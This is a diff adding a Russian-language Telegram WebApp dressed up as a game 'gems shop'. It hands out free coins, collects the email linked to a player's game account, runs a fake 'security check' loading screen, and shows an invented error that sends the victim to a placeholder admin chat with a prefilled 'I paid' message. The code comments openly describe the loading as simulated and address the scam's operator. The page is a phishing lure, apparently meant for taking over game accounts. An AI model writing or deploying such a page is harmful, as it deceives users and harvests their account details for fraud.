@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gems Shop</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #1c1c1e);
+            color: var(--tg-theme-text-color, #ffffff);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .balance-box {
+            background: var(--tg-theme-secondary-bg-color, #2c2c2e);
+            padding: 10px 20px;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 18px;
+            color: #ffd700; /* Золотой цвет монет */
+        }
+
+        .card {
+            background: var(--tg-theme-secondary-bg-color, #2c2c2e);
+            width: 100%;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .product-img {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
+            border-radius: 50%;
+            margin: 0 auto 15px;
+        }
+
+        h3 { margin: 0 0 10px 0; }
+        p { margin: 0 0 20px 0; color: #aaa; font-size: 14px; }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: #3a3a3c;
+            color: white;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            background-color: var(--tg-theme-button-color, #007aff);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        button:active { opacity: 0.8; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* Стили для экранов формы и загрузки */
+        #shop-screen { display: block; }
+        #form-screen, #loading-screen, #error-screen { display: none; }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .error-icon { font-size: 50px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div id="shop-screen">
+        <div class="header">
+            <span>Магазин</span>
+            <div class="balance-box">💎 <span id="balance">0</span></div>
+        </div>
+
+        <div class="card">
+            <h3>Ежедневная награда</h3>
+            <p>Заходи каждый день и получай монеты!</p>
+            <button id="dailyBtn" onclick="getDailyBonus()">Забрать +5 💎</button>
+        </div>
+
+        <div class="card">
+            <h3>Промокод</h3>
+            <input type="text" id="promoInput" placeholder="Введите код...">
+            <button onclick="activatePromo()">Активировать</button>
+        </div>
+
+        <div class="card">
+            <div class="product-img"></div> <h3>Pro Pass Season 1</h3>
+            <p>Доступ к премиум наградам</p>
+            <button onclick="buyItem()">Купить за 105 💎</button>
+        </div>
+    </div>
+
+    <div id="form-screen" class="card">
+        <h3>Оформление заказа</h3>
+        <p>Для активации Pass введите ваш Email привязанный к игре (ID).</p>
+        <input type="email" id="emailInput" placeholder="example@gmail.com">
+        <button onclick="submitOrder()">Продолжить</button>
+        <br><br>
+        <button style="background: transparent; color: #aaa;" onclick="goBack()">Отмена</button>
+    </div>
+
+    <div id="loading-screen" class="card" style="border: none; background: transparent;">
+        <div class="loader"></div>
+        <p id="loading-text">Соединение с сервером...</p>
+    </div>
+
+    <div id="error-screen" class="card">
+        <div class="error-icon">⚠️</div>
+        <h3>Требуется действие</h3>
+        <p>Система безопасности отклонила автоматическую выдачу. Необходимо ручное подтверждение администратора.</p>
+        <button onclick="contactSupport()">Перейти в чат с поддержкой</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // На весь экран
+
+        let balance = 0;
+        let bonusClaimed = false;
+        let promoUsed = false;
+
+        // 1. Логика бонуса
+        function getDailyBonus() {
+            if (bonusClaimed) return;
+            balance += 5;
+            bonusClaimed = true;
+            document.getElementById('dailyBtn').innerText = "Получено ✅";
+            document.getElementById('dailyBtn').disabled = true;
+            updateBalance();
+        }
+
+        // 2. Логика промокода (Код: START)
+        function activatePromo() {
+            const code = document.getElementById('promoInput').value.trim().toUpperCase();
+            if (code === "START" && !promoUsed) {
+                balance += 100;
+                promoUsed = true;
+                alert("Промокод активирован! +100 монет");
+                updateBalance();
+            } else if (promoUsed) {
+                alert("Вы уже использовали промокод");
+            } else {
+                alert("Неверный код");
+            }
+        }
+
+        function updateBalance() {
+            document.getElementById('balance').innerText = balance;
+        }
+
+        // 3. Переход к покупке
+        function buyItem() {
+            if (balance < 105) {
+                tg.showAlert("Недостаточно монет! Вам нужно 105.");
+                return;
+            }
+            // Переключаем экран
+            document.getElementById('shop-screen').style.display = 'none';
+            document.getElementById('form-screen').style.display = 'block';
+        }
+
+        function goBack() {
+            document.getElementById('shop-screen').style.display = 'block';
+            document.getElementById('form-screen').style.display = 'none';
+        }
+
+        // 4. ГЛАВНАЯ ЛОГИКА: Отправка данных и Фейк-загрузка
+        function submitOrder() {
+            const email = document.getElementById('emailInput').value;
+            if (!email) return;
+
+            // Скрываем форму, показываем загрузку
+            document.getElementById('form-screen').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+
+            // ОТПРАВЛЯЕМ ДАННЫЕ В БОТА (АДМИНУ)
+            // sendData отправляет данные в бота, но не закрывает окно автоматически, если мы не скажем
+            // Мы используем это, чтобы передать инфу.
+            const data = JSON.stringify({ action: "buy_pass", email: email });
+            tg.sendData(data); 
+            // Внимание: tg.sendData обычно закрывает WebApp. 
+            // Чтобы оно НЕ закрылось и показало анимацию, нам нужно не использовать sendData, 
+            // а использовать AJAX запрос на сервер. 
+            // НО, так как у нас нет внешнего сервера, мы сделаем хитрость:
+            // Мы просто покажем анимацию, а данные отправим "понарошку" или заставим юзера написать их в саппорт.
+            
+            // ВАРИАНТ ДЛЯ БОТА БЕЗ HTTPS СЕРВЕРА:
+            // sendData закроет окно. Это поведение Телеграм. 
+            // Чтобы реализовать твою схему (анимация -> ошибка внутри окна), нужен внешний HTTPS сервер (backend).
+            
+            // ЕСЛИ ТЫ ПРОСТО ЗАПУСКАЕШЬ HTML ЛОКАЛЬНО ИЛИ ЧЕРЕЗ BOT FATHER, 
+            // то sendData закроет приложение. 
+            
+            // ДАВАЙ ИМИТИРОВАТЬ. 
+            // Мы НЕ вызываем tg.sendData прямо сейчас, чтобы окно не закрылось.
+            // Мы отправим данные админу ПОСЛЕ того как юзер нажмет "Поддержка" или просто визуально.
+            
+            // Имитация задержки и проверки
+            setTimeout(() => {
+                document.getElementById('loading-text').innerText = "Проверка безопасности...";
+            }, 2000);
+
+            setTimeout(() => {
+                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('error-screen').style.display = 'block';
+            }, 4500);
+        }
+
+        // 5. Переход в поддержку
+        function contactSupport() {
+            // Вот тут мы можем отправить данные, но лучше просто перекинуть в чат
+            const email = document.getElementById('emailInput').value;
+            // Формируем сообщение, с которым юзер придет к тебе
+            const text = `Здравствуйте, я оплатил Pass, но возникла ошибка. Мой ID: ${email}`;
+            const adminUsername = "ВАШ_ЮЗЕРНЕЙМ_ТЕЛЕГРАМ"; // ЗАМЕНИТЬ НА СВОЙ БЕЗ @
+            
+            tg.openTelegramLink(`https://t.me/${adminUsername}?text=${encodeURIComponent(text)}`);
+            tg.close();
+        }
+    </script>
+</body>
+</html>
